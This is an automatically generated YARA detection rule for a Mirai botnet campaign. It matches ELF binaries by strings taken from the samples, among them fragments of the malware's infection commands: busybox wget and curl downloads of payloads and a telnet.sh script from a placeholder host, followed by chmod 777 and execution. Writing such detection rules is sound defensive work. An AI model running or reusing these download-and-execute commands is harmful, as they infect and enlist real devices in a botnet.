rule Sightlines_c2_22bea30f_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-22bea30f"
        date = "2026-11-24"
        campaign = "c2-22bea30f"
        family = "mirai"
        hash = "13ecdd109d989c81167e34a908598d746f57509a47389ff7062e26358ff8e148"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-22bea30f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "usybox wget http://%s/mips; chmod 777 mips; ./mips selfrep.realtek" ascii
        $s1 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel selfrep.realtek; /bin/b" ascii
        $s2 = "cd /tmp || cd /var || cd /dev/shm;wget http://%s/telnet.sh; curl -O http://%s/telnet.sh; chmod 777 t" ascii
        $s3 = "/proc/%d/task/%d/children" ascii
        $s4 = "Connection: keep-alive" ascii
        $s5 = "[0mNo shell available" ascii
        $s6 = "elnet.sh; sh telnet.sh; " ascii
        $s7 = "[0mAccess granted!" ascii
        $s8 = "[0mWrong password!" ascii
        $s9 = "/usr/bin/watchdogd" ascii
        $s10 = "/usr/sbin/watchdog" ascii
        $s11 = "/dev/misc/watchdog" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 11 of them
}
